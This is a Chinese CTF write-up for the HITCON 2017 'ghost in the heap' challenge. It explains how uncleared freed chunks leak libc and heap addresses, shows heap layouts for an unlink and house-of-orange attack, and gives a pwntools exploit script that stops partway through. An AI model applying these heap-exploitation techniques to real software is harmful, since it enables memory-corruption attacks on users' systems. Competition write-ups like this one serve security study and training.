# 【CTF攻略】hitcon2017之ghost in the heap writeup
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
作者：[mute_pig](http://bobao.360.cn/member/contribute?uid=1334092065)
预估稿费：600RMB
（本篇文章享受双倍稿费 活动链接请[点击此处](http://bobao.360.cn/news/detail/4370.html)）
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**前言**
这次出题人是上次 **houseoforange**
的出题人[angelboy](http://4ngelboy.blogspot.tw/)，这次出题的思路也很赞，光是想个 **unsorted bin**
的构造就想了两天，可惜的是最后使用 **houseoforange** 的时候发现是用了添加 **vtable** 验证的最新版 **libc**
，所以只能在赛后研究[出题人题解](https://github.com/scwuaptx/CTF/tree/master/2017-writeup/hitcon/ghost_in_the_heap)了。
**1\. ALL**
****
照例还是先看一下保护，和去年一样保护全开；接着看一下各个功能：
**new heap**
最多可以申请3个堆，大小固定的是0xa8，申请完就读值进去，然后会在字符串最后加个 **x00** 。  
**delete heap**
首先获取要释放堆的下标(0-2)，然后释放后只是将其 **ptr** 置0( **heapptr**
**[index]=0](http://www.mutepig.club/index.php/archives/70/)** )，但并没有将其空间置0。
**add ghost**
**ghost** 只能有一个，会 **malloc** 0x50的空间，最后8位是读入一个数字 **magic** ；之前的0x47是
**description** ，如果最后一个是 **n** 则替换为 **x00** 。
**remove ghost**
直接释放 **ghost** 的 **ptr** 。
**watch ghost**
判断有没有 **ghost** ，接着读入 **magic** 判断是否和上面输入的相同，不同就退出，相同就打印 **description** 。
那么可以总结一下主要功能：可以申请3个大小为0xb0的 **chunk** ,并且可以覆盖下一个 **chunk** 的 **size**
的最低位；以及可以申请一个大小为0x60的 **chunk** ；这四个 **chunk** 都能被释放且不会清空其中的内容，但不能修改各个
**chunk** 的内容；最后就是能查看内容的只有0x60的 **chunk** 。
**2\. LEAK**
****
**a) libc**
**unlink** 已经构造好了，那么关键就是泄露地址了，由于能查看内容的只有 **ghost** ，所以需要围绕它来进行构造。这里需要泄露
**libc** 和 **heap** 的地址。 泄露地址和一般一样，就是因为释放空间后没有清空，所以可以直接释放后再申请后打印， **libc**
的地址就存进去了。 由于 **ghost** 是没有强行加 **x00** 的，所以我们可以覆写 **fd** 但是打印出来 **bk** 。 于是可以构造
    newheap(0)
    newheap(1)
    delheap(0)
    addghost(1,'1'*8)
这样就能将 **libc** 的地址泄露出来了，但是我们还需要泄露堆地址。
**b) heap**
泄露堆地址的方法其实和泄露 **libc** 的一样，都是利用释放后的 **smallbins** 的链表，只是泄露 **libc** 只需要释放一个
**chunk** 就行了，但是泄露 **heap** 就需要释放两个才行。
    # 将ghost加入fastbin
    newheap(0)
    addhost(1,'1')
    delghost()
    # 构造堆
    newheap(1)
    newheap(2)
结果上面两步之后，形成堆结构如下：
    +=======+
     heap_0
    +=======+
     fastbin
    +=======+
     heap_1
    +=======+
     heap_2
    +=======+
然后释放 **heap_2** ，由于和 **top** 合并使得最后的 **size** 超过了 **fastbin** 的收缩阈值，所以就会调用
**malloc_consolidate** 将 **ghost** 加入 **unsorted bin**
    delheap(2)
接着将 **heap_1** 和 **ghost** 合并
    newheap(2)
    delheap(1)
形成堆结构如下：
    +=======+
     heap_0
    +=======+
    heap_1+ghost => unsorted bin
    +=======+
     heap_2
    +=======+
接着继续分割战场
    newheap(1)
    delheap(0)
形成堆结构如下：
    +=======+
     heap_0 => unsorted bin
    +=======+
     heap_1
    +=======+
    unsorted bin #(will be malloced to GHOST)
    +=======+
     heap_2
    +=======+
那么此时我们就已经拥有了两个 **unsorted bin** ，那么最后创建 **ghost** 就能继承 **unsorted bin** 了，并且其
**fd** 和 **bk** 都指向 **heap_0** 。 最后放个总的流程图：
**  
**
**3\. EXPLOIT**  
攻击思路有下面两个，不过都存在点问题需要绕过 * unlink 由于需要绕过 **unlink** 的判断，所以我们需要找到一个指向 **P+0X10**
的指针，也就是需要伪造一个堆才行。 那么在 **free** 的时候， **unlink** 可以合并前面或者后面的空闲块，但在这都有限制：
    前： 需要伪造P->prev_size并且P->PREV_INUSE=0，但是这里P->size都小于0x100，用NULL BYTE覆盖后size就为0了，所以不行
    后： 需要伪造P->size，失败原因同上
而最关键的是，这里不存在修改某 **chunk** 的功能，同时由于开启了 **PIE** 也无法泄露 **heap_ptr** 的地址，所以
**unlink** 应该是不行的。 * houseoforange 由于这里的 **ghost** 大小正好是0x60，那么如果我们将它置入
**unsorted bin** ，并且之后可以修改 **ghost- >bk**，那么就能够实现攻击。 首先申请如下的堆
    newheap(0)
    addghost(1, '1')
    newheap(1)
    newheap(2)
接着将 **ghost** 加入 **unsorted bin** 同时和释放的 **heap_0** 合并，再把 **heap2_2** 申请出来用来隔断
**top** ，最后释放 **heap_1** 将 **heap_2** 以上合并成一个整块
    delghost()
    delheap(0)
    delheap(2)
    newheap(2)
    delheap(1)
接着释放 **heap_0** ，再重新申请用来覆盖 **unsorted bin** 的 **size** ，使之从0x110->0x100
    newheap("0"*0xa0 + p64(0xb0))
到这一步骤的流程图如下：
接着再申请 **heap_1** ，使得 **unsorted bin** 的 **PREV_INUSE** 变成1，这样才能释放 **heap_0**
    newheap(1)
    delheap(1)
    delheap(0)
最后申请一个 **ghost** ，再申请一个 **heap_0** ，这时 **heap_2** 的上一个 **chunk** 的指向就被
**heap_0** 包含了，从而我们可以在 **heap_0** 里面构造一个 **fake_chunk**
    +=======+
     ghost (0x60)
    +=======+
     heap_0 (0xb0)
    +=======+
    unsorted bin (0xa0)
    +=======+
     无主之地 (0x10)
    +=======+
     heap_2 (prev_size=0x110 包含于heap_0 size=0x60表示上一块没使用)
    +=======+
到这里的流程图如下：
这样最后释放 **heap_2** 的时候，就会调用 **unlink** 与我们构造的 **fake_chunk** 合并为一个 **unsorted
bin** ，而我们此时可以控制其头部，于是就可以实现 **houseoforange** 攻击了。 由于给的 **libc** 是最新版的，所以对
**vtable** 进行了校验，所以无法使用 **houseoforange** 。那么先放个本地成功的 **exp** ：
    #!/usr/bin/env python
    # encoding: utf-8
    from pwn import *
    p = process("./ghost")
    libc = ELF("./libc.so.6")
    def newheap(data):
        p.recvuntil("Your choice: ")
        p.sendline("1")
        p.recvuntil("Data :")
        p.sendline(str(data))
    def delheap(index):
        p.recvuntil("Your choice: ")
        p.sendline("2")
        p.recvuntil("Index :")
        p.sendline(str(index))
    def addghost(magic, desc):
        p.recvuntil("Your choice: ")
        p.sendline("3")
        p.recvuntil("Magic :")
        p.sendline(str(magic))
        p.recvuntil("Description :")
        p.send(desc)
    def seeghost(magic):
        p.recvuntil("Your choice: ")
        p.sendline("4")
        p.recvuntil("Magic :")
        p.sendline(str(magic))
    def delghost():
        p.recvuntil("Your choice: ")
        p.sendline("5")
    def leak_libc():
        newheap("0")
        newheap("1")
        delheap(0)
        addghost(1,'1'*8)
        seeghost(1)
        ret = p.recvuntil('$')
        addr = ret.split('11111111')[1][:-1].ljust(8,'x00')
        unsorted_addr = u64(addr)-0xa0
        libc_addr = (unsorted_addr & 0xfffffffff000)-0x3c4000
        delghost()
        delheap(1)
        return unsorted_addr , libc_addr
    def leak_heap():
        newheap("0")
        addghost(1,'1'*8+'2'*8)
        delghost()
        newheap("1")
        newheap("2")
        delheap(2)
        newheap("2")
        delheap(1)
        newheap("1")
        delheap(0)
        addghost(1,'1'*9)
        #delheap(0)
        seeghost(1)
        ret = p.recvuntil('$')
        addr = ret.split('11111111')[1][:-1].ljust(8,'x00')
        heap_addr = (u64(addr)-0x31)
        delghost()
        delheap(1)
        delheap(2)
        return heap_addr
    def houseoforange(heap_addr):
        write_addr = heap_addr + 0x70
        aim_addr = heap_addr + 0xb0
        fd = write_addr - 0x18
        bk = write_addr - 0x10
        # malloc for 4
        newheap("0")
        addghost(1,'1')
        newheap("1")
        newheap("2")
        # unsortedbin(0x1c0) heap_2
        delghost()
        delheap(0)
        delheap(2)
        newheap("2")
        delheap(1)
        # heap_0 unsortedbin(0x100) nobody(0x10) heap_2
        newheap("0"*0xa0 + p64(0xb0))